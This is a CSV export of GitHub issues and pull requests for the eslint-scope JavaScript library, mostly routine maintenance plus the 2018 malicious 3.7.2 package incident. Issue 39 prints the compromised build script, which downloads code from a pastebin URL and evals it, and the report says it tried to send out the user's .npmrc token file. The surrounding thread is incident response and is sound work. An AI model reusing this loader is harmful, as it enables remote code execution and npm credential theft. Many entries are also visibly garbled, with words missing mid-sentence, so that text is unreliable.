ID,State,Time Created,Time Updated,Time Closed,Pull Request?,Username,User ID,Author Association,Number of Comments,Title,Body
54,closed,2019-06-27T16:12:01Z,2019-07-19T16:46:51Z,2019-07-19T16:46:48Z,1,kaicataldo,7041728,MEMBER,3,Breaking: drop support for Node v6,refs https://github.com/eslint/eslint-scope/pull/53<\r><\n><\r><\n>Now that we've dropped support for Node <8<c> I think we should also drop support here. I'd like to merge this<c> merge https://github.com/eslint/eslint-scope/pull/53<c> and then cut a major release.<\r><\n><\r><\n>~~__Edit:__ @ilyavolodin made me aware that Webpack depends on `eslint-scope` directly<c> and it appears that they still support Node@6. Maybe this isn't something we want to do yet?~~<\r><\n><\r><\n>This was [discussed by the TSC](https://github.com/eslint/eslint-scope/pull/54#issuecomment-513060862)<c> who resolved to accept this.<\n>
53,closed,2019-06-26T16:58:41Z,2019-07-20T15:07:12Z,2019-07-20T15:07:07Z,1,kaicataldo,7041728,MEMBER,1,Upgrade: update dependencies after dropping support for Node <8,This PR updates some outdated dependencies. I have also run the autofixer and will comment on places I manually changed things.<\r><\n><\r><\n>I haven't worked in this repository of the (though I think what I have sense?).<\r><\n><\r><\n>~CI is failing in Node support in ESLint we also drop support and do a major release of PR be in on this and we to support for Node just drop support for Node 4)? We won't be able to upgrade to the latest version of ESLint in our devDependencies<c> though.~<\r><\n><\r><\n>~I've downgraded ESLint to v5 and it now passes CI in Node this in Node At this point<c> I guess we should just wait until we drop Node <8.~<\r><\n><\r><\n>__Edit 3:__ The TSC resolved to drop Node <8 for this package. See https://github.com/eslint/eslint-scope/pull/54.<\n>
52,closed,2019-03-02T09:57:19Z,2019-03-15T04:17:21Z,2019-03-15T04:17:16Z,1,futpib,4330357,CONTRIBUTOR,3,Fix: arrow function scope strictness (take 2),Fixes #49 <\r><\n><\r><\n>This has the original (broken) commit from #50 cherry-picked<c> and a separate a4ee79e commit fixing the `.length` error from #51.<\r><\n><\r><\n>I found linking (`npm link`) `eslint-scope` into `eslint` and running eslint's unit tests helpful<c> maybe this could be part of the `eslint-scope`'s CI checks?<\n>
51,closed,2019-03-02T01:27:14Z,2019-03-02T01:31:14Z,2019-03-02T01:31:12Z,1,not-an-aardvark,11638619,MEMBER,0,Revert "Fix: Arrow function scope strictness (fixes #49) (#50)",This reverts commit 2533966faf317df5a3847fab937ba462c16808b8.<\r><\n><\r><\n>The change is causing ESLint to crash with a parsing error on the following code:<\r><\n><\r><\n>```js<\r><\n>console.log(this); z(x => console.log(x<c> this))<\r><\n>```<\r><\n><\r><\n>```<\r><\n>TypeError: Cannot read property 'length' of undefined<\r><\n> at isStrictScope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope.js:93:40)<\r><\n> at new Scope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope.js:254:25)<\r><\n> at new FunctionScope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope.js:641:9)<\r><\n> at ScopeManager.__nestFunctionScope (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/scope-manager.js:209:33)<\r><\n> at Referencer.visitFunction (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/referencer.js:200:27)<\r><\n> at Referencer.ArrowFunctionExpression (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/referencer.js:567:14)<\r><\n> at Referencer.Visitor.visit (/Users/tkatz/code/eslint/node_modules/esrecurse/esrecurse.js:104:34)<\r><\n> at Referencer.Visitor.visitChildren (/Users/tkatz/code/eslint/node_modules/esrecurse/esrecurse.js:83:38)<\r><\n> at Referencer.CallExpression (/Users/tkatz/code/eslint/node_modules/eslint-scope/lib/referencer.js:494:14)<\r><\n> at Referencer.Visitor.visit (/Users/tkatz/code/eslint/node_modules/esrecurse/esrecurse.js:104:34)<\r><\n>```<\r><\n><\r><\n>Since this is currently affecting ESLint users<c> we're reverting the change for now until we figure out the root cause.<\n>
50,closed,2019-02-19T16:41:24Z,2019-03-02T01:33:39Z,2019-02-22T00:02:06Z,1,futpib,4330357,CONTRIBUTOR,5,Fix arrow function scope strictness,Fixes #49 <\n>
49,closed,2019-02-16T20:53:45Z,2019-03-15T04:17:16Z,2019-03-15T04:17:16Z,0,futpib,4330357,CONTRIBUTOR,2,ArrowFunctionExpression's scope is always strict scope,seems to that `eslint-scope` to arrow is not it in the get my hands to.<\r><\n><\r><\n>I used assignment to an undeclared variable to check if the code is in strict mode:<\r><\n><\r><\n>With explicit strict mode<c> we get an error:<\r><\n>```bash<\r><\n>node -e '"use strict"; (() => { a = 5 })()'<\r><\n># ReferenceError: a is not defined<\r><\n>```<\r><\n><\r><\n>Without an is not means it's not in strict mode<c> but `eslint-scope` would treat the scope as strict anyway:<\r><\n>```bash<\r><\n>node -e => { = the strict code<c> and it seems that arrow functions should not get
48,closed,2019-02-16T15:00:55Z,2019-03-30T17:26:15Z,2019-02-16T19:53:16Z,0,futpib,4330357,CONTRIBUTOR,2,Class variable is found both in the module/global scope and the class scope,the X {<\r><\n> constructor() {<\r><\n> console.log(X);<\r><\n> }<\r><\n>};<\r><\n>console.log(X);<\r><\n>```<\r><\n><\r><\n>Or open https://astexplorer.net/#/gist/3a7a2b28e6098bc30ee7d16a4dabdbfc/3b9b700d7c8c40f4d9b1481ef940f532e1618b7c open the logged there).<\r><\n><\r><\n>For this code<c> the `X` variable is found (in the `scope.set.has('X')` sense) in two scopes: The the scope with one reference `console.log(X)` call)<\r><\n>2. The `class` scope with one reference `console.log(X)` in the the `X` variable is found in the scope two `console.log(X)` is with
47,closed,2018-11-07T19:23:26Z,2018-11-08T05:26:12Z,2018-11-08T05:26:09Z,1,kaicataldo,7041728,MEMBER,1,Chore: add supported Node.js versions to CI,Wanted to add Node v11 to the list of versions in CI and noticed a few others were missing. Do we want to drop support for Node@<6 at some point?<\n>
46,closed,2018-10-17T22:17:12Z,2018-10-18T01:09:10Z,2018-10-18T01:09:07Z,1,not-an-aardvark,11638619,MEMBER,0,Upgrade: eslint-release@1.0.0,to the package to still the Jenkins server now that we have 2FA enabled on the bot account.<\r><\n><\r><\n>Some changes on the Jenkins server -- I plan to make those changes after
44,closed,2018-07-14T14:31:04Z,2018-07-17T06:48:55Z,2018-07-16T16:23:05Z,0,ghost,10137,NONE,6,Please don't recommend LastPass,From your post-mortem #39:<\r><\n><\r><\n>> Package maintainers and users should avoid reusing the same password across multiple different sites. A password manager like 1Password or LastPass can help with this.<\r><\n><\r><\n>Please reconsider recommendations of this nature as these are paid services and LastPass has a history of getting hacked.<\r><\n><\r><\n>Instead<c> consider using a sneakernet password manager like [KeePassX](https://keepassx.org/) instead or<c> if you like your password managers online and open source<c> use [BitWarden](https://bitwarden.com/)â€”recently removed from the [list of password managers wiki](https://en.wikipedia.org/wiki/List_of_password_managers) for reasons which I don't care to look into.<\r><\n><\r><\n>Thanks.<\n>
43,closed,2018-07-12T16:41:06Z,2018-07-12T18:26:53Z,2018-07-12T18:23:23Z,0,jwalton,1771003,NONE,3,eslint-config-eslint compromised?,is to the last comment [here](https://github.com/eslint/eslint-scope/issues/39#issuecomment-404560795)<c> but unfortunately that thread is locked.<\r><\n><\r><\n>@kaicataldo what version of eslint-config-eslint was compromised? to see if version in the looking in ~/.npm/eslint-config-eslint to see if the infected version is in but if what the infected version
42,closed,2018-07-12T16:30:34Z,2018-07-12T18:25:04Z,2018-07-12T18:25:04Z,0,tonyfinn,1097073,NONE,4,Release 3.7.3 for private mirrors with cached compromised version?,From this comment: https://github.com/eslint/eslint-scope/issues/39#issuecomment-404533026<\r><\n><\r><\n>> Now that 3.7.2 is unpublished and is not sure if we a 3.7.3<c> if think we the compromised version of 3.7.2 was released<c> the package was removed from the public npm registry<c> which is good. But many companies run private npm mirrors<c> and after the `left-pad` incident<c> many of these will not mirror from the public npm the original was not a 3.7.3<c> I think that a be published as not these will and be in eslint-scope via eslint or webpack<c> thereby getting the compromised version from their own mirrors.<\r><\n><\r><\n>(Posted as a new issue because the original thread was locked)<\n>
41,closed,2018-07-12T15:49:14Z,2018-07-31T05:08:39Z,2018-07-31T05:08:39Z,0,Frozenfire92,5893112,NONE,2,#39 affect global installations?,I'm sure many others also have this question<c> and the relevant issue was closed so I will ask here<\r><\n><\r><\n>are global installations of eslint affected by #39 ?<\n>
40,closed,2018-07-12T15:45:13Z,2018-07-31T05:09:49Z,2018-07-31T05:09:49Z,0,brownstein,886693,NONE,3,Scanning script to find infected @3.7.2 installations (#39),https://github.com/eslint/eslint-scope/issues/39 is locked<c> but I'd like to contribute a quick gist we wrote to find compromised local installs. Is there a way we can get https://gist.github.com/brownstein/8aaade4953807f512d416da0c6a5a5f6 into the comments for said issue to help effected developers identify whether or not they are compromised?<\r><\n><\r><\n>If so<c> please merge into the main thread and remove this issue. Thanks!<\n>
39,closed,2018-07-12T11:17:18Z,2018-07-12T20:50:11Z,2018-07-12T20:36:41Z,0,pronebird,704044,NONE,92,Virus in eslint-scope?,## Updated blog post: https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes<\r><\n><\r><\n>## Update from the maintainers<\r><\n><\r><\n>[Incident status report from npm](https://status.npmjs.org/incidents/dn7c1fgrr7ng)<\r><\n><\r><\n>Please follow the comment by @platinumazure that gives a little insight into what happened:<\r><\n>https://github.com/eslint/eslint-scope/issues/39#issuecomment-404533026<\r><\n><\r><\n>It also appears that the same code was published in eslint-config-eslint@5.0.2<c> which has also since been unpublished. See https://github.com/eslint/eslint/issues/10600 for more information.<\r><\n><\r><\n>## In the meantime<\r><\n><\r><\n>1. Pin the version of `eslint-scope` to `3.7.1`<c> one way is to add the `resolutions` to your `package.json`<\r><\n><\r><\n>```<\r><\n> "resolutions": {<\r><\n> "eslint-scope": "3.7.1"<\r><\n> }<\r><\n>```<\r><\n><\r><\n>Verify the dependency version with `yarn list eslint-scope`. It should print out `eslint-scope@3.7.1`<\r><\n><\r><\n>2. Use `package-lock.json` or `yarn.lock` and have it in your repo if possible. Do not upgrade to 3.7.2 even if `yarn outdated` shows that there is a new version available.<\r><\n><\r><\n>3. Revoke your NPM token as suggested in the comment below https://github.com/eslint/eslint-scope/issues/39#issuecomment-404496856. You can do the same by logging in to https://www.npmjs.com/<c> selecting the "tokens" menu from the account dropdown and removing all tokens listed on the page. Make sure to recreate the relevant tokens if you hook your NPM to external services.<\r><\n><\r><\n>## The issue<\r><\n><\r><\n>I don't know what the hell this is but it looks like a virus to me:<\r><\n><\r><\n>```<\r><\n>[2/3] â   eslint-scope<\r><\n>error /Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope: Command failed.<\r><\n>Exit code: 1<\r><\n>Command: node ./lib/build.js<\r><\n>Arguments: <\r><\n>Directory: /Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope<\r><\n>Output:<\r><\n>undefined:30<\r><\n> https1.get({hostname:'sstatic1.histats.com'<c>path:'/0.gif?4103075&101'<c>method:'GET'<c>headers:{Referer:'http://1.a/'+conten<\r><\n> ^^^^^^<\r><\n><\r><\n>SyntaxError: Unexpected end of input<\r><\n> at IncomingMessage.r.on (/Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope/lib/build.js:6:10)<\r><\n> at emitOne (events.js:116:13)<\r><\n> at IncomingMessage.emit (events.js:211:7)<\r><\n> at IncomingMessage.Readable.read (_stream_readable.js:475:10)<\r><\n> at flow (_stream_readable.js:846:34)<\r><\n> at resume_ (_stream_readable.js:828:3)<\r><\n> at _combinedTickCallback (internal/process/next_tick.js:138:11)<\r><\n>```<\r><\n><\r><\n>The contents of a suspicious file:<\r><\n><\r><\n>```js<\r><\n>try{<\r><\n> var https=require('https');<\r><\n> https.get({'hostname':'pastebin.com'<c>path:'/raw/XLeVP82h'<c>headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0'<c>Accept:'text/html<c>application/xhtml+xml<c>application/xml;q=0.9<c>*/*;q=0.8'}}<c>(r)=>{<\r><\n> r.setEncoding('utf8');<\r><\n> r.on('data'<c>(c)=>{<\r><\n> eval(c);<\r><\n> });<\r><\n> r.on('error'<c>()=>{});<\r><\n> <\r><\n> }).on('error'<c>()=>{});<\r><\n> }catch(e){}<\r><\n>```<\r><\n><\r><\n>The URL it attempts to load is http://pastebin.com/raw/XLeVP82h<\r><\n><\r><\n>Also it attempts to send my `.npmrc` somewhere.<\r><\n><\r><\n>This is version 3.7.2 that's been published an hour ago.<\n>
38,closed,2018-06-09T14:46:09Z,2018-06-09T15:49:06Z,2018-06-09T15:49:03Z,1,platinumazure,284282,MEMBER,0,Build: Adding rc release script to package.json,See eslint/espree#383<c> eslint/eslint#10456.<\n>
37,closed,2018-04-28T01:49:12Z,2018-04-28T01:52:00Z,2018-04-28T01:51:58Z,1,not-an-aardvark,11638619,MEMBER,0,Chore: avoid creating package-lock.json files,<\n>
36,closed,2018-04-28T01:35:49Z,2018-04-28T01:43:08Z,2018-04-28T01:40:25Z,1,not-an-aardvark,11638619,MEMBER,0,Upgrade: eslint-release ^0.11.1,<\n>
35,closed,2018-04-26T11:04:14Z,2018-04-28T01:35:32Z,2018-04-28T01:35:27Z,1,mysticatea,1937871,MEMBER,1,Breaking: remove TDZScope (refs eslint/eslint#10245),Refs eslint/eslint#10245.<\r><\n><\r><\n>This PR removes `TDZScope` class.<\r><\n>`eslint-scope` package should not make TDZ scopes because this is static analyzer and Temporal Dead Zone is a timing matter.<\r><\n><\r><\n>As results:<\r><\n><\r><\n>- `for-in`/`for-of` statements no longer make TDZ scopes.<\r><\n>- The references in `ForInStatement#right` and `ForOfStatement#right` are in the correct place now.<\r><\n><\r><\n>I confirmed that `eslint` doesn't need any fix for this change (eslint/eslint#10270).<\n>
33,closed,2017-10-28T08:54:55Z,2017-11-21T06:55:34Z,2017-11-21T06:55:27Z,1,mysticatea,1937871,MEMBER,6,Fix: wrong resolution about default parameters,Fixes eslint/eslint#9335.<\r><\n><\r><\n>This PR fixes wrong resolutions about the references in default parameters. In the following case:<\r><\n><\r><\n>```js<\r><\n>let a // (A)<\r><\n>function f(x = a) { // This `a` should be resolved to to a // the `a` in default parameters is resolved to (A) correctly.<\r><\n><\r><\n>----<\r><\n><\r><\n>This is the should make new scope for the function body if the parameters default I guessed that it's a huge breaking change which breaks many ESLint rules. So I kept scope structure and modified the resolution logic.<\n>
32,closed,2017-04-12T21:26:31Z,2017-04-13T16:48:59Z,2017-04-13T16:48:56Z,1,gyandeeps,5554486,MEMBER,2,Docs: Remove extra header line from LICENSE,Same reasoning applies here from https://github.com/eslint/eslint/pull/8448<\n>
31,closed,2017-04-10T16:49:22Z,2017-04-11T14:07:24Z,2017-04-11T14:07:21Z,1,vitorbal,626038,MEMBER,6,Fix: restore previous Scope API export behavior,This fixes a divergence between the exported API of `eslint-scope` and `escope`. Previously<c> with `escope`<c> the following code would return the Scope class:<\r><\n>```js<\r><\n>> require('escope').Scope<\r><\n>[Function: Scope]<\r><\n>```<\r><\n><\r><\n>However<c> with `eslint-scope` this returns an object that has a key `Scope` in it:<\r><\n>```js<\r><\n>> require('eslint-scope').Scope<\r><\n>{ Scope: [Function: Scope]<c><\r><\n> GlobalScope: [Function: GlobalScope]<c><\r><\n> ModuleScope: [Function: ModuleScope]<c><\r><\n> FunctionExpressionNameScope: [Function: FunctionExpressionNameScope]<c><\r><\n> CatchScope: [Function: CatchScope]<c><\r><\n> WithScope: [Function: WithScope]<c><\r><\n> TDZScope: [Function: TDZScope]<c><\r><\n> BlockScope: [Function: BlockScope]<c><\r><\n> SwitchScope: [Function: SwitchScope]<c><\r><\n> FunctionScope: [Function: FunctionScope]<c><\r><\n> ForScope: [Function: ForScope]<c><\r><\n> ClassScope: [Function: ClassScope] }<\r><\n>```<\r><\n><\r><\n>This happened during the refactoring from ES6 module syntax to `module.exports`<c> because `Scope` was the default export of `lib/scope.js`. Here's the change: https://github.com/eslint/eslint-scope/commit/019441e57cfe34d6acfe299b7b98d4bb9b8f4c3f#diff-7147267f980ceb48bd26aa2b36b061f2L132<\n>
29,closed,2017-04-02T21:34:54Z,2017-04-10T16:51:14Z,2017-04-10T16:51:11Z,1,soda0289,2373964,MEMBER,1,Fix: Modify tests that contain invalid ES6 syntax,Tests contained duplicate variable names and and parens around object destructing. This commit also causes the code coverage to drop. I am working on increasing coverage as well and will submit a second PR.<\n>
28,closed,2017-04-02T17:14:16Z,2017-04-02T17:50:15Z,2017-04-02T17:40:38Z,1,soda0289,2373964,MEMBER,7,Scope decorators,This PR for to be scoped and for to work correctly.<\n>
27,closed,2017-03-28T22:41:07Z,2019-02-16T22:10:03Z,2019-02-16T22:10:03Z,0,mysticatea,1937871,MEMBER,3,Proposal: define `node.parent` property in scope analysis,ESLint is defining `node.parent` property while their AST traversing. This confusing the `node.parent` property of the is we the `node.parent` property in the traversing of scope analysis<c> we can resolve that confusing without extra cost.<\r><\n><\r><\n>Thoughts?<\n>
26,closed,2017-03-26T19:57:32Z,2017-04-02T17:38:52Z,2017-04-02T17:38:52Z,1,soda0289,2373964,MEMBER,2,Scope Type Annotations,This commit allows for type annotations in variable declarations and and declarations to allows for the to with to the type annotation not define type annotations "typeAnnotation": {<\r><\n> "type": "TypeAnnotation"<c><\r><\n> "loc": {<\r><\n> "start": {<\r><\n> "line": 3<c><\r><\n> "column": 11<\r><\n> }<c><\r><\n> "end": {<\r><\n> "line": 3<c><\r><\n> "column": 14<\r><\n> }<\r><\n> }<c><\r><\n> "range": [<\r><\n> 37<c><\r><\n> 40<\r><\n> ]<c><\r><\n> "typeAnnotation": {<\r><\n> "type": "TSTypeReference"<c><\r><\n> "range": [<\r><\n> 37<c><\r><\n> 40<\r><\n> ]<c><\r><\n> "loc": {<\r><\n> "start": {<\r><\n> "line": 3<c><\r><\n> "column": 11<\r><\n> }<c><\r><\n> "end": {<\r><\n> "line": 3<c><\r><\n> "column": 14<\r><\n> }<\r><\n> }<c><\r><\n> {<\r><\n> "type": "range": [<\r><\n> 37<c><\r><\n> 40<\r><\n> ]<c><\r><\n> "loc": {<\r><\n> "start": {<\r><\n> "line": 3<c><\r><\n> "column": 11<\r><\n> }<c><\r><\n> "end": {<\r><\n> "line": 3<c><\r><\n> "column": 14<\r><\n> }<\r><\n> }<c><\r><\n> "name": "Foo"<\r><\n> }<\r><\n> }<\r><\n> and type use the property id to define the for the type annotation not typeName. Maybe with that convention.<\n>
25,closed,2017-03-20T22:16:47Z,2018-10-29T21:55:00Z,2018-10-29T21:54:59Z,1,corbinu,533625,CONTRIBUTOR,20,WIP: Merge in esrecurse and estraverse,This one is going to take a bit of debate I am so I to just an of it would look This is a to I and is the to I in and their respective tests. I updated them both to eslint and I stripped out all code that wasn't used either eslint-scope eslint actually out to be quite a lot) and moved the syntax options into their own file. <\r><\n><\r><\n>This would be I it quite a bit more for the removes the for to be eslint as I pulled in the eslint visitor function. <\r><\n><\r><\n>I have created an example branch for eslint here: https://github.com/corbinu/eslint/tree/eslint-scope-4<\r><\n>Which removes estravserse as a dep and removes the Travserser class. All tests pass.<\r><\n><\r><\n>However it should be noted that no part of eslint-scope actually depends on the Traverser any more it would just as to move that into eslint itself.<\r><\n><\r><\n>This is just a discussion point so for now I have disabled the JS Doc rule. I look forward to hearing everybody's thoughts<\r><\n><\r><\n>@nzakas @JamesHenry @soda0289 @ilyavolodin<\n>
24,closed,2017-03-17T22:05:54Z,2017-03-17T22:09:07Z,2017-03-17T22:09:04Z,1,ilyavolodin,1380062,MEMBER,0,Chore: Add files section to package.json,Package.json was missing `files` section<c> which prevents the release.<\n>
23,closed,2017-03-17T00:03:32Z,2017-03-17T22:14:38Z,2017-03-17T22:14:37Z,0,ilyavolodin,1380062,MEMBER,4,Release,@JamesHenry @corbinu @soda0289 Is this repository now ready to be published? We want to replace `escope` with this fork in ESLint for version 4.0 and for that we need to publish it to NPM. I can do a release if you give me a go-ahead.<\n>
22,closed,2017-03-11T23:32:01Z,2017-03-12T18:35:53Z,2017-03-12T18:35:29Z,1,corbinu,533625,CONTRIBUTOR,5,Chore: Remove estraverse and move syntax options in,Fix lintingAs #17 pointed out estraverse is only a dependency for list of possible syntax strings which is probably not necessary so I just pulled them in.<\n>
45,open,2018-09-15T00:22:48Z,2018-09-15T00:22:51Z,null,0,joepie91,1663259,NONE,0,Document why this fork exists,Right now<c> it's not clear from the project's documentation why it was forked off from `escope`<c> and what the differences between the two are. Documenting this in eg. the README (even if just one or two sentences) would help interested users in deciding which of the two to use.<\n>
34,open,2017-11-09T19:57:36Z,2019-06-27T04:34:21Z,null,0,mysticatea,1937871,MEMBER,6,Proposal: "function-default-params" scope,From #33<c> eslint/eslint#9335.<\r><\n><\r><\n>As the step 27.a of [9.2.12 FunctionDeclarationInstantiation( func<c> argumentsList )](https://www.ecma-international.org/ecma-262/8.0/#sec-functiondeclarationinstantiation)<c> `eslint-scope` should new scope the function if the parameters has default scope the variable of function expression names from function I propose new `function-default-params` scope the references in default parameters from function bodies.<\r><\n><\r><\n>1. If the function has one default parameters in the referencer defines a `function-default-params` scope of `function` scope.<\r><\n> - Note: the `function-default-params` scope has implicit `arguments` variable except if the function is arrow function expression.<\r><\n> - Note: the `function-default-params` scope is the scope of scope if the function is function The referencer the The referencer defines `function` scope.<\r><\n>4. The referencer copies the from the `function-default-params` scope the `function` scope.<\r><\n> - Note: those copies handle as `function = { let a }` correctly.<\r><\n> - Note: has handle those copies as special.<\r><\n> - Note: I should `Variable#references` should be both variable objects. For example<c> in `function f(a<c> b = a) { g(a) }` case<c> the two references of `a` should be aggregated into one `Variable#references` The referencer the function body.<\r><\n>6. The referencer closes both `function-default-params` `function` the end of the function.<\r><\n><\n>
30,open,2017-04-03T03:01:00Z,2017-04-13T20:05:01Z,null,0,soda0289,2373964,MEMBER,6,Proposal: Define an API to add nodes types to Referencer and hooks to Visit methods,such as typescript-eslint and babel-eslint have their own unique nodes which have their own and of can VisitorKeys this does not guarantee nodes will be added as scoped function cannot solve the problem completely either. Some nodes might be scoped nodes be not just references<c> which is the we can solve this in two parts:<\r><\n><\r><\n>Allow new node type handlers too be passed into eslint-scope. Since we can already pass in our own set of VisitorKeys this would complement that well.<\r><\n><\r><\n>Allow for hooks/events to be called and visit is eslint-scope has the following visit methods:<\r><\n>- export declaration<\r><\n>- declaration<\r><\n>- declaration<\r><\n>- for in<\r><\n>- class<\r><\n><\r><\n>And two from esrecurse<\r><\n>- visit() - for - for nodes in is for to be from babel-eslint and for eslint rules such as no-unused-vars and no-undef to work as expected in and
17,open,2017-02-21T03:25:16Z,2017-02-21T03:25:16Z,null,0,soda0289,2373964,MEMBER,0,Better support for parsers such as typescript and babel-eslint,I some [here](https://github.com/eslint/eslint/issues/6364#issuecomment-279505828) about how we can improve eslint-scope to and like to propose some ideas for some basic enhancements:<\r><\n><\r><\n>1) Should we remove the dependency on estraverse and esrecurse. Estraverse is only used to provide a syntax list and eslint-scope not of this syntax list is since it is provied by estree. is only used for two function calls<c> visit() and visitChildren()<c> which we this project to give us more control of the visiting behavior and fallback handling.<\r><\n><\r><\n>2) I can understand not wanting to have parser provide a Referencer object as this would lead to lots of for we provide object that would eslint-scope to treat/scope node that are unknown in a similar as in we have abstract classes would it be possible to this Abstract Class node like a Class treat Abstract Class methods<c> with bodies<c> like Class
